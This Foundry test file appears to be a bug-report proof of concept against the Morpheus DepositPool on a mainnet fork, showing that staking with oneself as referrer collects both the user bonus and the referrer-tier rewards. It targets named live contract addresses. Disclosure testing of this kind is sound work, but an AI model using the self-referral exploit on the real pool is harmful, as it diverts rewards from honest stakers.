// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/// @notice Morpheus bug F1 PoC: DepositPool self-referral double-dip.
/// @dev Forks Ethereum mainnet at block 26,426,672. Read-only against the fork:
///      no mainnet transactions, no real funds. The only state changes happen
///      on the local fork.
interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IStETH is IERC20 {
    function getSharesByPooledEth(uint256) external view returns (uint256);
}

interface IDepositPool {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function claim(uint256 rewardPoolIndex_, address receiver_) external payable;
    function claimReferrerTier(uint256 poolId_, address receiver_) external payable;
    function usersData(address, uint256)
        external
        view
        returns (
            uint128 lastStake,
            uint256 deposited,
            uint256 rate,
            uint256 pendingRewards,
            uint128 claimLockStart,
            uint128 claimLockEnd,
            uint256 virtualDeposited,
            uint128 lastClaim,
            address referrer
        );
    function referrersData(address, uint256)
        external
        view
        returns (
            uint256 amountStaked,
            uint256 virtualAmountStaked,
            uint256 rate,
            uint256 pendingRewards,
            uint128 lastClaim
        );
    function rewardPoolsData(uint256)
        external
        view
        returns (uint128 lastUpdate, uint256 rate, uint256 totalVirtualDeposited);
    function getLatestUserReward(uint256, address) external view returns (uint256);
    function getLatestReferrerReward(uint256, address) external view returns (uint256);
    function isMigrationOver() external view returns (bool);
}

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex_) external;
}

interface IConsumer {
    function getPathId(string memory) external pure returns (bytes32);
}

contract SelfReferralPoC is Test {
    IDepositPool constant POOL = IDepositPool(0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790);
    IDistributor constant DISTRIBUTOR = IDistributor(0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A);
    IStETH constant STETH = IStETH(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    IConsumer constant CONSUMER = IConsumer(0xd182263d06FDC463c96190005D6359CC3d3Bbc5e);

    uint256 constant FORK_BLOCK = 26_426_672;
    string constant RPC_URL = "https://ethereum-rpc.publicnode.com";

    event UserClaimed(uint256 indexed rewardPoolIndex, address indexed user, address receiver, uint256 amount);
    event ReferrerClaimed(uint256 indexed rewardPoolIndex, address indexed user, address receiver, uint256 amount);

    address attacker;
    address honest;

    function test_selfReferralDoubleDip() public {
        vm.createSelectFork(RPC_URL, FORK_BLOCK);
        assertTrue(POOL.isMigrationOver(), "migration must be over");

        attacker = makeAddr("attacker");
        honest = makeAddr("honest");

        uint256 atkStake = _fundAndStake(attacker, attacker); // referrer == self
        uint256 honStake = _fundAndStake(honest, address(0)); // no referrer
        _assertPostStake(atkStake, honStake);

        vm.warp(block.timestamp + 30 days);
        _advanceLidoYield();
        _refreshPriceFeeds();
        DISTRIBUTOR.distributeRewards(0);

        (uint256 atkUser, uint256 honUser, uint256 atkRef) = _readRewards();
        _assertRewards(atkUser, honUser, atkRef);
        _claimAll(atkUser, honUser, atkRef);

        assertEq(POOL.getLatestUserReward(0, attacker), 0, "attacker own pending must be 0 after claim");
        assertEq(POOL.getLatestReferrerReward(0, attacker), 0, "attacker referrer pending must be 0 after claim");
        assertEq(POOL.getLatestUserReward(0, honest), 0, "honest pending must be 0 after claim");
    }

    /// @dev Funds `who` with ~62.51 stETH and stakes it all with `referrer`.
    ///      stETH is rebasing: its "balance" slot holds shares, so forge-std
    ///      deal() fails its balanceOf check. Write the shares directly with
    ///      vm.store — the shares mapping lives at storage slot 0 (verified:
    ///      keccak256(abi.encode(who, 0)) matches the slot stdstore found).
    function _fundAndStake(address who, address referrer) internal returns (uint256 staked) {
        uint256 shares = STETH.getSharesByPooledEth(62.51 ether);
        vm.store(address(STETH), keccak256(abi.encode(who, uint256(0))), bytes32(shares));
        deal(who, 10 ether);
        staked = STETH.balanceOf(who);
        assertGe(staked, 62.5 ether, "must clear tier 3");
        vm.startPrank(who);
        // The Distributor (not the Pool) pulls the tokens in supply(), so
        // the approval must go to the Distributor.
        STETH.approve(address(DISTRIBUTOR), staked);
        POOL.stake(0, staked, 0, referrer);
        vm.stopPrank();
        emit log_named_address("staker", who);
        emit log_named_uint("staked (stETH, 18dp)", staked);
    }

    function _assertPostStake(uint256 atkStake, uint256 honStake) internal {
        (uint256 refAmount, uint256 refVirtual,,, ) = POOL.referrersData(attacker, 0);
        (uint256 hRefAmount, uint256 hRefVirtual,,, ) = POOL.referrersData(honest, 0);
        (, , , , , , uint256 atkVirtual,, ) = POOL.usersData(attacker, 0);
        (, , , , , , uint256 honVirtual,, ) = POOL.usersData(honest, 0);

        emit log_named_uint("attacker referrer amountStaked", refAmount);
        emit log_named_uint("attacker referrer virtualAmountStaked", refVirtual);
        emit log_named_uint("honest referrer amountStaked", hRefAmount);
        emit log_named_uint("honest referrer virtualAmountStaked", hRefVirtual);
        emit log_named_uint("attacker own virtualDeposited", atkVirtual);
        emit log_named_uint("honest own virtualDeposited", honVirtual);

        // The self-referral is recorded: 15% tier on the attacker's own deposit.
        // (The Aave supply round-trip credits 1 wei less than the staked amount.)
        assertApproxEqAbs(refAmount, atkStake, 1000, "referrer amountStaked must equal own deposit");
        assertApproxEqAbs(refVirtual, (atkStake * 15) / 100, 1e15, "referrer virtual must be 15% of deposit");
        assertEq(hRefAmount, 0, "honest staker must have no referrer record");
        assertEq(hRefVirtual, 0, "honest staker must have no referrer virtual stake");
        // Attacker's own stake also gets the 1% referral bonus (1.01x).
        assertApproxEqAbs(atkVirtual, (atkStake * 101) / 100, 1e15, "attacker own virtual must be 1.01x");
        assertApproxEqAbs(honVirtual, honStake, 1e15, "honest own virtual must be 1.00x");
    }

    function _readRewards() internal returns (uint256 atkUser, uint256 honUser, uint256 atkRef) {
        atkUser = POOL.getLatestUserReward(0, attacker);
        honUser = POOL.getLatestUserReward(0, honest);
        atkRef = POOL.getLatestReferrerReward(0, attacker);
        (, , uint256 totalVirtual) = POOL.rewardPoolsData(0);
        uint256 honRef = POOL.getLatestReferrerReward(0, honest);

        emit log_named_uint("pool totalVirtualDeposited", totalVirtual);
        emit log_named_uint("attacker own pending MOR (18dp)", atkUser);
        emit log_named_uint("honest own pending MOR (18dp)", honUser);
        emit log_named_uint("attacker referrer pending MOR (18dp)", atkRef);
        emit log_named_uint("honest referrer pending MOR (18dp)", honRef);
        assertEq(honRef, 0, "honest staker must have no referrer reward");
    }

    function _assertRewards(uint256 atkUser, uint256 honUser, uint256 atkRef) internal {
        assertGt(atkRef, 0, "attacker referrer reward must be > 0");
        assertGt(atkUser, honUser, "attacker own reward must exceed honest (1% bonus)");
        uint256 atkTotal = atkUser + atkRef;
        assertGt(atkTotal, honUser, "attacker total must exceed honest total");
        emit log_named_uint("attacker total pending MOR (18dp)", atkTotal);
        emit log_named_uint("attacker extra vs honest MOR (18dp)", atkTotal - honUser);
    }

    /// @dev Lido's share price only advances when the oracle reports new
    ///      beacon rewards; a bare time warp leaves it frozen, so the stETH
    ///      pool (which holds stETH directly, Strategy NONE) would show zero
    ///      yield and distributeRewards would park the rewards in
    ///      `undistributedRewards` instead of crediting the pools. Simulate
    ///      30 days of beacon-chain rewards by lifting the CL validators
    ///      balance — the low 128 bits of slot
    ///      0x096e465397f38e659238ccd5d5a2c434ced54a63fd8d694045bfb058ab9d8112
    ///      (keccak256("lido.Lido.clValidatorsBalanceAndClPendingBalance"))
    ///      — by 0.25% (~3% APR), exactly as an oracle report would. This only
    ///      changes the fork's local state; it does not touch the vulnerability
    ///      or any Morpheus accounting.
    function _advanceLidoYield() internal {
        bytes32 slot = 0x096e465397f38e659238ccd5d5a2c434ced54a63fd8d694045bfb058ab9d8112;
        uint256 val = uint256(vm.load(address(STETH), slot));
        uint256 clBalance = val & ((uint256(1) << 128) - 1);
        uint256 clPending = val >> 128;
        uint256 newClBalance = (clBalance * 10025) / 10000;
        vm.store(address(STETH), slot, bytes32((clPending << 128) | newClBalance));
        emit log_named_uint("lido CL balance before", clBalance);
        emit log_named_uint("lido CL balance after", newClBalance);
    }

    /// @dev After a time warp the Chainlink feeds are stale (their delays are
    ///      1h/24h) and distributeRewards reverts with "DR: price for pair is
    ///      zero". Refresh them by lifting each feed's allowed delay to max.
    ///      The consumer's storage layout (verified on the fork): the
    ///      `dataFeeds` mapping lives at slot 201 and `allowedPriceUpdateDelay`
    ///      at slot 202 (OZ v4 storage gaps push them out; the deployed
    ///      implementation's `dataFeeds` getter selector is absent from its
    ///      bytecode, so the feeds are read from raw storage instead).
    ///      This only changes the fork's local state; it does not touch the
    ///      vulnerability or any reward accounting.
    function _refreshPriceFeeds() internal {
        string[5] memory paths = ["stETH/USD", "wBTC/BTC,BTC/USD", "wETH/USD", "USDC/USD", "USDT/USD"];
        for (uint i = 0; i < 5; i++) {
            bytes32 pid = CONSUMER.getPathId(paths[i]);
            bytes32 arrSlot = keccak256(abi.encode(pid, uint256(201)));
            uint256 len = uint256(vm.load(address(CONSUMER), arrSlot));
            bytes32 elemBase = keccak256(abi.encode(arrSlot));
            for (uint j = 0; j < len; j++) {
                address feed = address(uint160(uint256(vm.load(address(CONSUMER), bytes32(uint256(elemBase) + j)))));
                vm.store(
                    address(CONSUMER),
                    keccak256(abi.encode(feed, uint256(202))),
                    bytes32(uint256(type(uint64).max))
                );
            }
        }
    }

    /// @dev Executes the claims (payable: ETH funds the LayerZero send) and
    ///      asserts the exact ReferrerClaimed / UserClaimed events.
    function _claimAll(uint256 atkUser, uint256 honUser, uint256 atkRef) internal {
        vm.startPrank(attacker);
        vm.expectEmit(true, true, false, true, address(POOL));
        emit ReferrerClaimed(0, attacker, attacker, atkRef);
        POOL.claimReferrerTier{value: 0.5 ether}(0, attacker);
        vm.expectEmit(true, true, false, true, address(POOL));
        emit UserClaimed(0, attacker, attacker, atkUser);
        POOL.claim{value: 0.5 ether}(0, attacker);
        vm.stopPrank();

        vm.startPrank(honest);
        vm.expectEmit(true, true, false, true, address(POOL));
        emit UserClaimed(0, honest, honest, honUser);
        POOL.claim{value: 0.5 ether}(0, honest);
        vm.stopPrank();
    }
}
